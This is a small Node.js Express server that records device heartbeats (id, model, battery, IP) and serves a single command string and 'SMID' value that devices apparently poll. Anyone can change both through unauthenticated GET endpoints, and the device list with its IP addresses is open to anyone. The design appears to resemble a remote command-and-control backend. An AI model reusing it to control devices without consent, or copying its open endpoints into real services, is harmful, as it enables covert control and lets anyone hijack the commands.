const express = require("express");

const app = express();
const PORT = process.env.PORT || 3000;

// memory store
let SMID = "B55e1f5b3-5e7b-4c6d-9a31-b8f2d6e4c324";
let CMD = "safe";

// 🔥 active devices store
let devices = {};

// -------------------------------
// ✅ DEVICE REGISTER / HEARTBEAT
// -------------------------------
app.get("/ping", (req, res) => {
  const id = req.query.id;

  if (!id) {
    return res.send("missing id");
  }

  devices[id] = {
    model: req.query.model || "unknown",
    battery: req.query.battery || "unknown",
    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
    lastSeen: Date.now()
  };

  res.send("ok");
});

// -------------------------------
// 📊 VIEW DEVICES
// -------------------------------
app.get("/devices", (req, res) => {
  res.json(devices);
});

// -------------------------------
// 🔥 CMD CONTROL (per device optional)
// -------------------------------
app.get("/cmd", (req, res) => {
  res.send(CMD);
});

app.get("/set-cmd", (req, res) => {
  CMD = req.query.value || "safe";
  res.send("CMD updated: " + CMD);
});

// -------------------------------
app.get("/smid", (req, res) => {
  res.send(SMID);
});

app.get("/set-smid", (req, res) => {
  SMID = req.query.value || SMID;
  res.send("SMID updated: " + SMID);
});

// -------------------------------
app.get("/", (req, res) => {
  res.send("Server Running");
});

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
